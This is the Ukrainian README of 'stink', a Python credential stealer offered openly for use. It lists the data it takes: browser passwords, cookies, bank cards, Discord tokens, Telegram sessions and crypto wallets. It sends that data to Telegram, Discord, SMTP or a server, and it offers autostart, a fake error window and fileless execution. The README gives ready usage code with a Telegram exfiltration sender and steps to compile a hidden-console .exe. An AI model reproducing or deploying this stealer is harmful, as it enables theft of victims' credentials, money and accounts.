# stink

Стилер всього лише в декілька рядків з відправкою до Telegram / Server / Discord / SMTP. Без залежностей, тільки вбудовані бібліотеки.

**Wiki:** https://github.com/FallenAstaroth/stink/wiki

## Опис
`stink` вже має значний функціонал, який тільки розширюватиметься.

## Навігація
* [Поточні можливості](#Поточні-можливості)
* [Приклад використання](#Приклад-використання)
  * [Стандартний](#Стандартний)
  * [Певні модулі](#Певні-модулі)
  * [Додаткові параметри](#Додаткові-параметри)
* [Створення exe](#Створення-exe)
  * [Створення виконуваного файла](#Створення-виконуваного-файла)
  * [За допомогою BAT](#За-допомогою-BAT)
  * [За допомогою CMD](#За-допомогою-CMD)

### Поточні можливості
1. Підтримка наступних браузерів:
   - Chrome
   - Opera
   - Opera GX
   - Edge
   - Brave
   - Vivaldi
   - Yandex (Частково)
2. Збір наступних даних:
   - Скріншот
   - Кукі
   - Паролі
   - Банківські карти
   - Історія
   - Закладки
   - IP-адреса
   - Конфігурація системи
   - Активні процеси
   - Токени Discord
   - Сесії Telegram
   - Хости FileZilla
   - Крипто гаманці:
       - Metamask
       - Phantom
       - Atomic
       - Exodus
       - Інші 7 гаманців
   - Конфіги Steam
3. Вбудовані методи відправлення:
   - Telegram
   - Server
   - Discord
   - SMTP
4. Підтримка мультипрофілів браузера.
5. Виконання в окремому потоці.
6. Виконання з використанням багатопроцесорності.
7. Можливість додання в автозапуск.
8. Вивід вікна з фейковою помилкою.
9. Виконання без створення будь яких файлів.

## Приклад використання
### Стандартний
```python
from stink import Stealer, Senders

if __name__ == '__main__':
    Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
```
### Певні модулі

Приклад зі збором тільки системних даних і скріншота.
```python
from stink import Stealer, Features, Senders

if __name__ == '__main__':
    Stealer(
        senders=[
            Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)
        ], 
        features=[
            Features.system,
            Features.screenshot
        ]
    ).run()
```
### Додаткові параметри

- `features` - вмикає модулі зі списку. Модулі можна імпортувати з `stink.enums.Features`. Доступні модулі:

  - `passwords` - збір паролів.

  - `cookies` - збір кукі.

  - `cards` - збір банківських карт.

  - `history` - збір історії пошуку.

  - `bookmarks` - збір закладок.

  - `extensions` - збір розширень браузера.

  - `processes` - збір активних процесів.

  - `system` - збір конфігурації системи.

  - `screen` - скріншот.

  - `discord` - збір токенів Discord.

  - `telegram` - збір сесій Telegram.

  - `filezilla` - збір хостів FileZilla.

  - `wallets` – збір крипто гаманців.

  - `steam` - збір конфігів Steam.


- `utils` - вмикає утиліти зі списку. Утиліти можна імпортувати з `stink.enums.Utils`. Доступні утиліти:

  - `autostart` - додання в автозапуск.

  - `message` - вивід фейкового вікна помилки.
  

- `senders` - запускає способи надсилання зі списку. Способи надсилання можна імпортувати з `stink.enums.Senders`. Доступні способи надсилання:

  - `server` - відправка на сервер.

  - `telegram` - відправка в Telegram.

  - `discord` - відправка в Discord.

  - `smtp` - відправка на пошту.

## Створення exe
Python являється інтерпретованою мовою програмування, тому ми спочатку транслюємо його в C, а потім скомпілюємо в .exe файл.
Для цього нам знадобиться Nuitka.

### Створення виконуваного файла

1. [Завантажуємо](https://github.com/FallenAstaroth/stink/archive/refs/heads/master.zip) архів.
2. Розпаковуємо архів і переходимо в директорію stink-master.
3. Створюємо test.py (або будь-яку іншу назву) файл в цій же директорії з наступним кодом:
```python
from stink import Stealer, Senders

if __name__ == '__main__':
    Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
```

### За допомогою BAT
1. Запускаємо compiler.bat.

### За допомогою CMD
1. Відкриваємо `cmd`.
2. Прописуємо команду:
```
pip install virtualenv
```
3. Переходимо в папку з файлом `test.py`:
```
cd path\to\file
```
4. Створюємо віртуальне оточення і активуємо його:
```
virtualenv venv
```
```
venv\Scripts\activate
```
5. Встановлюємо Nuitka:
````
pip install Nuitka==0.6.16.4
````
6. Для зменшення розміру файла додатково встановлюємо Zstandard (опціонально):
```
pip install zstandard==0.17.0
```
7. Прописуємо команду:
```
nuitka --onefile --plugin-enable=multiprocessing --windows-disable-console test.py
```

Після виконання команди отримуємо test.exe файл із прихованою консоллю.
